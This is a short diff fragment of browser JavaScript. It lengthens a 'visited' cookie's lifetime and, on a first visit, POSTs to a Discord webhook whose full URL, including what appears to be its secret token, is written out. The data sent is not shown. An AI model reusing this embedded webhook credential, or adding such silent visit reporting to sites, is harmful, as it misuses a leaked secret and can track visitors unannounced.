@@ -34,7 +34,7 @@ function getCookie(name) {
 
   if (!getCookie("visited")) {
 
-    document.cookie = "visited=true; max-age=5; path=/";
+    document.cookie = "visited=true; max-age=1800; path=/";
 
     fetch("https://discord.com/api/webhooks/1480869073549136014/xCCNId_UdxCfYU3tMoU2st3XlglSalUOsBSXXwV3mCLv39HHSTDl02vYWchl_iQU9nxE", {
       method: "POST",
